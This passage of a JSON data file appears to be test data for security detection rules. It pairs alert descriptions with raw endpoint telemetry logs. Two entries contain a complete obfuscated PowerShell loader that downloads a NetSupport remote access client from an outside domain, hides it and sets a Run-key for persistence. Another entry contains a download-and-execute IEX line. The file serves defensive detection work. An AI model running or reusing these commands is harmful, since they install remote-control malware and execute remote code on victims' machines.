            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\myfile.exe\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\\",\"Description\":\" \",\"EventID\":1,\"FileVersion\":\"1.0.0.0\",\"Hashes\":\"MD5=2B248E9302A441C389C30A85534C0CC2,SHA256=05D6B2F8A9C4C319CA23E571B9BD77142F3C880524A67B6F6783550AF620374B,IMPHASH=9F9C7E0B30ED8F52F90B658711975D4C\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\myfile.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-83CA-6536-C5CD-030000000000}\",\"LogonId\":\"0x3cdc5\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"myfile.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-83CA-6536-6B00-000000004A00}\",\"ParentProcessId\":\"4965\",\"ProcessGuid\":\"{C784477D-969B-653B-B006-000000004A00}\",\"ProcessID\":2305,\"ProcessId\":\"10145\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1379905,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":705,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-11-28 05:32:18.115\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "21": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityprogram.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\stevemorris\\\\Desktop\\\\program.exe\\\"\",\"Company\":\"Softdiv Software Sdn Bhd\",\"Computer\":\"DESKTOP-SM\",\"CurrentDirectory\":\"C:\\\\Users\\\\stevemorris\\\\Desktop\\\\\",\"Description\":\"Softdiv MP3 to WAV Converter.exe\",\"EventID\":1,\"FileVersion\":\"0.3.2.0\",\"Hashes\":\"MD5=4265F75CBB4BA1BC23B07890ED42872B,SHA256=5A29583A80B7DC2CBCE4B8712024DCDFF9F777D908B6F16DFB3D59FAD991083E,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744\",\"Hostname\":\"stevemorris-pc\",\"Image\":\"C:\\\\Users\\\\stevemorris\\\\Desktop\\\\program.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-AA65-6384-87E8-030000000000}\",\"LogonId\":\"0x3e887\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"fbab6880a695.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-AA65-6384-6B00-000000004300}\",\"ParentProcessId\":\"4920\",\"ProcessGuid\":\"{C784477D-3B4B-638F-0206-000000004300}\",\"ProcessID\":2288,\"ProcessId\":\"6288\",\"Product\":\"Softdiv MP3 to WAV Converter 3.2\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":92332,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":688,\"User\":\"DESKTOP-SM\\\\stevemorris\",\"UserID\":\"S-1-5-12-783622181-14434791-6080415151-691320\",\"UtcTime\":\"2024-11-18 05:32:40.000000\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "22": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityclient32.exe launched by powershell.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\client32.exe\\\" \",\"Company\":\"NetSupport Ltd\",\"Computer\":\"wins-d19\",\"CurrentDirectory\":\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\\",\"Description\":\"NetSupport Client Application\",\"EventID\":1,\"FileVersion\":\"V12.70\",\"Hashes\":\"MD5=877F5E83FB39DE16FA8BBD93BA9F07F1,SHA256=418744FA1ADE539C280461387DF87DDA6BF84C7D755EBBBDC6123FD5659F9467,IMPHASH=A9D50692E95B79723F3E76FCF70D023E\",\"Hostname\":\"wins-d19\",\"Image\":\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\client32.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-081A-6482-DB4F-040000000000}\",\"LogonId\":\"0x44fdb\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"client32.exe\",\"ParentCommandLine\":\"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -ExecutionPolicy Bypass -Command \\\"cd $env:AppData; $Z1P0r='R0k3r.zip'; $eXp4r0cH=Get-Command expand-archive -ErrorAction SilentlyContinue; $p4NteCh=$env:APPDATA+'\\\\'+$Z1P0r; $lI0n3k='https://a.ezydict.com/4th_2.zip'; $r1N4m='OfficeStartup'; $b1tS1iT=Get-Command Start-BitsTransfer -ErrorAction SilentlyContinue; $b1tSiRcDm = 'bitsadmin.exe /transfer MeDoW /download /priority normal '+$lI0n3k+' '+$p4NteCh; $peS1zP=$env:APPDATA+'\\\\'+$r1N4m; if ($eXp4r0cH) {if ($b1tS1iT) {Start-BitsTransfer -Source $lI0n3k -Destination $p4NteCh;} else {Invoke-Expression -Command $b1tSiRcDm}; expand-archive -path $p4NteCh -destinationpath $peS1zP; Remove-Item -path $p4NteCh;} else {$f1L1es=@('AudioCapture.dll', 'client32.exe', 'client32.ini', 'HTCTL32.DLL', 'msvcr100.dll', 'nskbfltr.inf', 'NSM.LIC', 'pcicapi.dll', 'PCICHEK.DLL', 'PCICL32.DLL', 'remcmdstub.exe', 'TCCTL32.DLL'); $lI0n3k2='http://YOUR.LINK/files/'; New-Item -Path $env:APPDATA -Name $r1N4m -ItemType 'directory'; if ($b1tS1iT) {$f1L1es | ForEach-Object {$s10r13s=$lI0n3k2+$_; $1dus1T=$peS1zP+'\\\\'+$_; Start-BitsTransfer -Source $s10r13s -Destination $1dus1T; }; } else { $f1L1es | ForEach-Object { $s10r13s=$lI0n3k2+$_; $1dus1T=$peS1zP+'\\\\'+$_; $b1tSiRcDm2='bitsadmin.exe /transfer MeDoW /download /priority normal '+$s10r13s+' '+$1dus1T; Invoke-Expression -Command $b1tSiRcDm2; }; }; }; $F1l1ed3=Get-Item $peS1zP -Force; $F1l1ed3.attributes='Hidden'; cd $peS1zP; start client32.exe; $F33Sr=$peS1zP+'\\\\client32.exe'; New-ItemProperty -Path 'HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -Name $r1N4m -Value $F33Sr  -PropertyType 'String'; #g7Vc*-Jh7tZPfY0q6P5D5o15GdlrN#Y7-mQOJpX*i$pocw(-ErQELxY\\u0026de$r0xwndS-WV3PLGJ%5zWmLeyAPpYrP*#qgHDM=7UOXjaCfWx=8nWHx_sEFQE%tw1R)g7A\\u0026)mBA6nJeZiFOS=Zh#DbY^=WJyZDO2!XWKJGFqFa-$s*agin!r0kd#f!^RPu@mnF5NaBx6$fE$T\\u0026d6kyj3\\u0026vFok--dte8=1hK!QM-M$8m1C@n%OO%lq$1iaeWW5SX1aBcfkAi\\u0026UwPe_xOHnJiEct^1VBmC2EJy3uw_Zi5(eis^88NYX\\u00267n\\u0026mf%#iy0fVL\\u0026T_eRg-S8pE(0qg=MaIDD(Spzk37l7hMRe\\u0026Q@0twVYvUbE=hnofn@AA*Y(Sz$oK!J382C00v^yZSnMlyL6CVD!=T-s)*uFi%OxVSNzxSj_=%lOWdZm\\u0026HNCi$C+Ar9Ype=-RxmJsdwSEMjJ7@sT@A^vi4+jebdE\\u0026W_Uxbgc\\u0026j2G1KjeA!=\\u0026yH$B_bHLM+Bpn4hY6$pnFWXPCr4JrlKYo(Pra)eeS_L3d=sopqXgG^H+#j*l!zvex+%J#T8cZM\\u0026Y((gzD7HiCQJ(-9bRCrh6nV+c7eiQiQ_h6ywU0P3AUtnzlGdq6C$*GS$^(=7\\u0026$KnWWpsczhj@VG6(+frmeyyBNnQawJE-q(V3tEo=gkOq2b5hXIu9+AjgmHra@j07QroSPC2YC55!IQi@Y=t-eUJav@Wrd8M%oUXixYa0ftlsa@c6iWW(Q_vCl_)lDr\\u0026CzRHa^\\u0026qTFyM5CiXjkxQ6Pn6zNT_Cd6Cqv7F^ACC7qKAw7JPm^6K_Zp+wPr(V(l0k@qhe0HTdjB+lJYN*@ICyrrUAmA8DVa\\u0026c9xcq_+-T#zfYDP!d6!TOF%\\u0026R1eX%oMdi3a3_32Yq*njTDjsVs*PwD)L#e4)bV@dxM\\u0026%1BwbsZvdlYka=j+fe9*niSr1C(1(E!K!9!HBGfvAG%US=ipYlC\\u0026eA(4)lN3t^I3hMWVWPxMWlJSiCI3n5yTPYp$ni5pQMGH@-#\\u0026#^_k(d6UCVqtqpC!4^#TfS@8s\\u0026QA^cEZe!jXJR4_6uq3Y-lHr0D_hkxn9LMN$RY#ugP^B2kzoQU(cdqJ5Y+igS1fQ0h=87xG_j$XS)6J3r*((T6+!Fuq+L@@(81_dZyXPn3E9oEiZca9A0x7=@q1qyeN93JFFXP4lJk^8n1iABAm\\u0026PdofW\\u0026hXHfFC!kxz(PvTTNIuk6G^l6=OqnhXW_1hD_GYo\\u0026=RH\\u0026TpLTSj^VoPBPfSYFKxoPXNN@R31wLxUsMeyVieYz*rRUBFQTkp3Me8eC516O5^jvvdn3\\u0026D$$z17mWM=+1C+FjF\\\"\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"ParentProcessGuid\":\"{C784477D-B0D6-648B-B80A-000000004A00}\",\"ParentProcessId\":\"6632\",\"ProcessGuid\":\"{C784477D-B0F2-648B-BA0A-000000004A00}\",\"ProcessID\":2240,\"ProcessId\":\"2352\",\"Product\":\"NetSupport Manager\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":749896,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":2996,\"User\":\"wins-d19\\\\lisawalker\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-11-21 05:34:07.000\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        ]
    },
    "23": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitymyfile.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\myfile.exe\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\\",\"Description\":\" \",\"EventID\":1,\"FileVersion\":\"1.0.0.0\",\"Hashes\":\"MD5=2B248E9302A441C389C30A85534C0CC2,SHA256=05D6B2F8A9C4C319CA23E571B9BD77142F3C880524A67B6F6783550AF620374B,IMPHASH=9F9C7E0B30ED8F52F90B658711975D4C\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\myfile.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-83CA-6536-C5CD-030000000000}\",\"LogonId\":\"0x3cdc5\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"myfile.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-83CA-6536-6B00-000000004A00}\",\"ParentProcessId\":\"4965\",\"ProcessGuid\":\"{C784477D-969B-653B-B006-000000004A00}\",\"ProcessID\":2305,\"ProcessId\":\"10145\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1379905,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":705,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-11-05 05:32:28.115\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "24": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitypowershell.exe launched by powershell.exe",
        "ini_data": [
            "{\"@timestamp\":1735882279299,\"meta\":{\"traceId\":\"01GE20GABCTSA2Q413A1M1P9HT\",\"accountId\":\"553410142016245253\",\"osFamily\":\"windows\",\"computerName\":\"DESKTOP1\",\"agentVersion\":\"S1-WIN/21.7.5.1080\",\"siteId\":\"239629223416646331\",\"osRevision\":\"19042\",\"osName\":\"Windows 10 Enterprise\",\"uuid\":\"0c422588231f4d5ab2de15490c8f2361\",\"seqId\":0,\"machineType\":\"desktop\",\"mgmtUrl\":\"https://sg-prod.sentinelone.net\"},\"event\":{\"parent\":{\"parent\":{\"excluded\":\"E_UNSUPPORTED\",\"node\":{\"key\":{\"value\":\"425855B6823E7E61\"}},\"isRedirectedCommandProcessor\":\"E_UNSUPPORTED\",\"root\":\"E_UNSUPPORTED\",\"interactive\":\"E_UNSUPPORTED\",\"name\":\"\",\"subsystem\":\"SUBSYSTEM_UNKNOWN\",\"fullPid\":{\"pid\":0,\"startTime\":{\"millisecondsSinceEpoch\":\"0\"}},\"isWow64\":\"E_UNSUPPORTED\",\"sessionId\":0,\"commandLine\":\"\",\"integrityLevel\":\"INTEGRITY_LEVEL_UNKNOWN\"},\"trueContext\":{\"key\":{\"value\":\"E7C914C67537C662\"}},\"counters\":{\"dnsLookups\":0,\"crossProcess\":0,\"fileModification\":0,\"netConnOut\":0,\"moduleLoad\":206,\"fileDeletion\":0,\"crossProcessDupThreadHandle\":0,\"registryModification\":159,\"osChildProcess\":1,\"modelChildProcess\":1,\"crossProcessOpenProcess\":0,\"fileCreation\":0,\"exeModification\":0,\"crossProcessOutOfGroup\":0,\"netConnIn\":0,\"crossProcessDupProcessHandle\":0,\"crossProcessRemoteThread\":0},\"interactive\":\"E_FALSE\",\"subsystem\":\"SYS_WIN32\",\"sessionId\":2,\"executable\":{\"owner\":{\"name\":\"\",\"sid\":\"\"},\"node\":{\"key\":{\"value\":\"6212826804D001B2\"}},\"path\":\"C:\\\\WINDOWS\\\\System32\\\\powershell.exe\",\"creationTime\":{\"millisecondsSinceEpoch\":\"17358822792915951616\"},\"signature\":{\"signed\":{\"valid\":{},\"identity\":\"MICROSOFT WINDOWS\"}},\"hashes\":{\"sha1\":\"36c5d12033b2eaf251bae61c00690ffb17fddc87\",\"sha256\":\"908b64b1971a979c7e3e8ce4621945cba84854cb98d76367b791a6e22b5f6d53\",\"md5\":\"cda48fc75952ad12d99e526d0b6bf70a\"},\"fileLocation\":\"Local\",\"isKernelModule\":\"E_UNSUPPORTED\",\"isDir\":\"E_FALSE\",\"sizeBytes\":\"253768\"},\"excluded\":\"E_FALSE\",\"node\":{\"key\":{\"value\":\"D768DCE2C33CF0CB\"}},\"isRedirectedCommandProcessor\":\"E_FALSE\",\"root\":\"E_FALSE\",\"name\":\"Windows PowerShell\",\"fullPid\":{\"pid\":11224,\"startTime\":{\"millisecondsSinceEpoch\":\"1735882279299\"}},\"isWow64\":\"E_FALSE\",\"commandLine\":\"IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:36595/'); Get-NetComputer -ping -operatingsystem *server*\",\"integrityLevel\":\"HIGH\",\"user\":{\"name\":\"SG\\\\Admin\",\"sid\":\"S-1-5-21-947102721-2557683097-696379042-94871\"}},\"process\":{\"parent\":{\"excluded\":\"E_UNSUPPORTED\",\"node\":{\"key\":{\"value\":\"D768DCE2C33CF0CB\"}},\"isRedirectedCommandProcessor\":\"E_UNSUPPORTED\",\"root\":\"E_UNSUPPORTED\",\"interactive\":\"E_UNSUPPORTED\",\"name\":\"\",\"subsystem\":\"SUBSYSTEM_UNKNOWN\",\"fullPid\":{\"pid\":0,\"startTime\":{\"millisecondsSinceEpoch\":\"0\"}},\"isWow64\":\"E_UNSUPPORTED\",\"sessionId\":0,\"commandLine\":\"\",\"integrityLevel\":\"INTEGRITY_LEVEL_UNKNOWN\"},\"trueContext\":{\"key\":{\"value\":\"E7C914C67537C662\"}},\"counters\":{\"dnsLookups\":0,\"crossProcess\":1,\"fileModification\":0,\"netConnOut\":0,\"moduleLoad\":52,\"fileDeletion\":0,\"crossProcessDupThreadHandle\":0,\"registryModification\":0,\"osChildProcess\":0,\"modelChildProcess\":0,\"crossProcessOpenProcess\":1,\"fileCreation\":0,\"exeModification\":0,\"crossProcessOutOfGroup\":0,\"netConnIn\":0,\"crossProcessDupProcessHandle\":0,\"crossProcessRemoteThread\":0},\"interactive\":\"E_FALSE\",\"subsystem\":\"SYS_WIN32\",\"sessionId\":2,\"executable\":{\"owner\":{\"name\":\"\",\"sid\":\"\"},\"node\":{\"key\":{\"value\":\"68F355F95F451218\"}},\"path\":\"C:\\\\WINDOWS\\\\System32\\\\powershell.exe\",\"creationTime\":{\"millisecondsSinceEpoch\":\"17358822792995951616\"},\"signature\":{\"signed\":{\"valid\":{},\"identity\":\"MICROSOFT WINDOWS\"}},\"hashes\":{\"sha1\":\"092ac6f8d072c4cf045e35a839d5bb8f1360f1ae\",\"sha256\":\"a290ce75c6c6b37af077b72dc9c2c347a2eede4fafa6551387fa8469539409c7\",\"md5\":\"16cde93b441e4363700dfbf34c687b08\"},\"fileLocation\":\"Local\",\"isKernelModule\":\"E_UNSUPPORTED\",\"isDir\":\"E_FALSE\",\"sizeBytes\":\"862208\"},\"excluded\":\"E_FALSE\",\"node\":{\"key\":{\"value\":\"C6BB4940F0BFA542\"}},\"isRedirectedCommandProcessor\":\"E_FALSE\",\"root\":\"E_FALSE\",\"name\":\"Task Scheduler Configuration Tool\",\"fullPid\":{\"pid\":3244,\"startTime\":{\"millisecondsSinceEpoch\":\"1735882279299\"}},\"isWow64\":\"E_FALSE\",\"commandLine\":\"\\\\??\\\\C:\\\\WINDOWS\\\\system32\\\\schtasks.exe 0xffffffff -ForceV1\",\"integrityLevel\":\"HIGH\",\"user\":{\"name\":\"SG\\\\Admin\",\"sid\":\"S-1-5-21-947102721-2557683097-696379042-94871\"}},\"trueContext\":{\"key\":{\"value\":\"E7C914C67537C662\"}},\"signature\":{\"signed\":{\"valid\":{},\"identity\":\"MICROSOFT WINDOWS\"}},\"hashes\":{\"sha1\":\"092ac6f8d072c4cf045e35a839d5bb8f1360f1ae\",\"sha256\":\"a290ce75c6c6b37af077b72dc9c2c347a2eede4fafa6551387fa8469539409c7\",\"md5\":\"16cde93b441e4363700dfbf34c687b08\"},\"type\":\"processCreation\",\"status\":\"UNKNOWN\"}}\r\nudm.principal.process.file.full_path: C:\\WINDOWS\\System32\\powershell.exe\r\nudm.principal.process.file.sha256: 908b64b1971a979c7e3e8ce4621945cba84854cb98d76367b791a6e22b5f6d53"
        ]
    },
    "25": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityF20B.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\F20B.exe\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\\",\"Description\":\"-\",\"EventID\":1,\"FileVersion\":\"-\",\"Hashes\":\"MD5=317C1DA3D49D534FDDE575395DA84879,SHA256=72674E9A3C32D5457C98EF723B938ABC0295329C7EC58F9E07A0CB1E99631F48,IMPHASH=84E31D32A2CB7830E40CFCBEA395C7A1\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\F20B.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-8F33-6539-44AD-030000000000}\",\"LogonId\":\"0x3ad44\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"-\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-8F34-6539-6A00-000000003B00}\",\"ParentProcessId\":\"4944\",\"ProcessGuid\":\"{C784477D-ACAA-653D-7D06-000000003B00}\",\"ProcessID\":2332,\"ProcessId\":\"6284\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":462620,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":696,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-11-12 05:32:19.136\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "26": {
        "alert_brief": "Alert on known Hash querying a known hostname with VT Relationshipsto manygoodnews.com",
        "ini_data": [
            "{\"event_simpleName\":\"DnsRequest\",\"ContextTimeStamp\":\"1722213206\",\"ConfigStateHash\":\"9542156506\",\"ContextProcessId\":\"8960054625103\",\"DomainName\":\"manygoodnews.com\",\"ContextThreadId\":\"967634005093619\",\"aip\":\"10.8.13.29\",\"QueryStatus\":\"87\",\"InterfaceIndex\":\"0\",\"ConfigBuild\":\"1007.3.0011809.1\",\"event_platform\":\"Win\",\"DnsRequestCount\":\"1\",\"DualRequest\":\"1\",\"Entitlements\":\"15\",\"name\":\"DnsRequestV4\",\"id\":\"217339fb-172e-4bf1-a397-e92639d6080a\",\"EffectiveTransmissionClass\":\"3\",\"aid\":\"e2327adb69e83e6f9deaf40da1e4c653\",\"timestamp\":\"1722227607\",\"cid\":\"b140194b2ba51f0ba1e93ba0187310b2\",\"RequestType\":\"1\",\"UserName\":\"adablack\"}\r\nudm.principal.process.file.full_path: \\Device\\HarddiskVolume1\\Program Files\\C:\\Users\\adablack\\Downloads\\Client Update.exe\r\nudm.principal.process.file.sha256: c10cd1c78c180ba657e3921ee9421b9abd5b965c4cdfaa94a58e383b45bb72ca"
        ]
    },
    "27": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityclient32.exe launched by powershell.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\client32.exe\\\" \",\"Company\":\"NetSupport Ltd\",\"Computer\":\"wins-d19\",\"CurrentDirectory\":\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\\",\"Description\":\"NetSupport Client Application\",\"EventID\":1,\"FileVersion\":\"V12.70\",\"Hashes\":\"MD5=877F5E83FB39DE16FA8BBD93BA9F07F1,SHA256=418744FA1ADE539C280461387DF87DDA6BF84C7D755EBBBDC6123FD5659F9467,IMPHASH=A9D50692E95B79723F3E76FCF70D023E\",\"Hostname\":\"wins-d19\",\"Image\":\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\client32.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-081A-6482-DB4F-040000000000}\",\"LogonId\":\"0x44fdb\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"client32.exe\",\"ParentCommandLine\":\"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -ExecutionPolicy Bypass -Command \\\"cd $env:AppData; $Z1P0r='R0k3r.zip'; $eXp4r0cH=Get-Command expand-archive -ErrorAction SilentlyContinue; $p4NteCh=$env:APPDATA+'\\\\'+$Z1P0r; $lI0n3k='https://a.ezydict.com/4th_2.zip'; $r1N4m='OfficeStartup'; $b1tS1iT=Get-Command Start-BitsTransfer -ErrorAction SilentlyContinue; $b1tSiRcDm = 'bitsadmin.exe /transfer MeDoW /download /priority normal '+$lI0n3k+' '+$p4NteCh; $peS1zP=$env:APPDATA+'\\\\'+$r1N4m; if ($eXp4r0cH) {if ($b1tS1iT) {Start-BitsTransfer -Source $lI0n3k -Destination $p4NteCh;} else {Invoke-Expression -Command $b1tSiRcDm}; expand-archive -path $p4NteCh -destinationpath $peS1zP; Remove-Item -path $p4NteCh;} else {$f1L1es=@('AudioCapture.dll', 'client32.exe', 'client32.ini', 'HTCTL32.DLL', 'msvcr100.dll', 'nskbfltr.inf', 'NSM.LIC', 'pcicapi.dll', 'PCICHEK.DLL', 'PCICL32.DLL', 'remcmdstub.exe', 'TCCTL32.DLL'); $lI0n3k2='http://YOUR.LINK/files/'; New-Item -Path $env:APPDATA -Name $r1N4m -ItemType 'directory'; if ($b1tS1iT) {$f1L1es | ForEach-Object {$s10r13s=$lI0n3k2+$_; $1dus1T=$peS1zP+'\\\\'+$_; Start-BitsTransfer -Source $s10r13s -Destination $1dus1T; }; } else { $f1L1es | ForEach-Object { $s10r13s=$lI0n3k2+$_; $1dus1T=$peS1zP+'\\\\'+$_; $b1tSiRcDm2='bitsadmin.exe /transfer MeDoW /download /priority normal '+$s10r13s+' '+$1dus1T; Invoke-Expression -Command $b1tSiRcDm2; }; }; }; $F1l1ed3=Get-Item $peS1zP -Force; $F1l1ed3.attributes='Hidden'; cd $peS1zP; start client32.exe; $F33Sr=$peS1zP+'\\\\client32.exe'; New-ItemProperty -Path 'HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -Name $r1N4m -Value $F33Sr  -PropertyType 'String'; #g7Vc*-Jh7tZPfY0q6P5D5o15GdlrN#Y7-mQOJpX*i$pocw(-ErQELxY\\u0026de$r0xwndS-WV3PLGJ%5zWmLeyAPpYrP*#qgHDM=7UOXjaCfWx=8nWHx_sEFQE%tw1R)g7A\\u0026)mBA6nJeZiFOS=Zh#DbY^=WJyZDO2!XWKJGFqFa-$s*agin!r0kd#f!^RPu@mnF5NaBx6$fE$T\\u0026d6kyj3\\u0026vFok--dte8=1hK!QM-M$8m1C@n%OO%lq$1iaeWW5SX1aBcfkAi\\u0026UwPe_xOHnJiEct^1VBmC2EJy3uw_Zi5(eis^88NYX\\u00267n\\u0026mf%#iy0fVL\\u0026T_eRg-S8pE(0qg=MaIDD(Spzk37l7hMRe\\u0026Q@0twVYvUbE=hnofn@AA*Y(Sz$oK!J382C00v^yZSnMlyL6CVD!=T-s)*uFi%OxVSNzxSj_=%lOWdZm\\u0026HNCi$C+Ar9Ype=-RxmJsdwSEMjJ7@sT@A^vi4+jebdE\\u0026W_Uxbgc\\u0026j2G1KjeA!=\\u0026yH$B_bHLM+Bpn4hY6$pnFWXPCr4JrlKYo(Pra)eeS_L3d=sopqXgG^H+#j*l!zvex+%J#T8cZM\\u0026Y((gzD7HiCQJ(-9bRCrh6nV+c7eiQiQ_h6ywU0P3AUtnzlGdq6C$*GS$^(=7\\u0026$KnWWpsczhj@VG6(+frmeyyBNnQawJE-q(V3tEo=gkOq2b5hXIu9+AjgmHra@j07QroSPC2YC55!IQi@Y=t-eUJav@Wrd8M%oUXixYa0ftlsa@c6iWW(Q_vCl_)lDr\\u0026CzRHa^\\u0026qTFyM5CiXjkxQ6Pn6zNT_Cd6Cqv7F^ACC7qKAw7JPm^6K_Zp+wPr(V(l0k@qhe0HTdjB+lJYN*@ICyrrUAmA8DVa\\u0026c9xcq_+-T#zfYDP!d6!TOF%\\u0026R1eX%oMdi3a3_32Yq*njTDjsVs*PwD)L#e4)bV@dxM\\u0026%1BwbsZvdlYka=j+fe9*niSr1C(1(E!K!9!HBGfvAG%US=ipYlC\\u0026eA(4)lN3t^I3hMWVWPxMWlJSiCI3n5yTPYp$ni5pQMGH@-#\\u0026#^_k(d6UCVqtqpC!4^#TfS@8s\\u0026QA^cEZe!jXJR4_6uq3Y-lHr0D_hkxn9LMN$RY#ugP^B2kzoQU(cdqJ5Y+igS1fQ0h=87xG_j$XS)6J3r*((T6+!Fuq+L@@(81_dZyXPn3E9oEiZca9A0x7=@q1qyeN93JFFXP4lJk^8n1iABAm\\u0026PdofW\\u0026hXHfFC!kxz(PvTTNIuk6G^l6=OqnhXW_1hD_GYo\\u0026=RH\\u0026TpLTSj^VoPBPfSYFKxoPXNN@R31w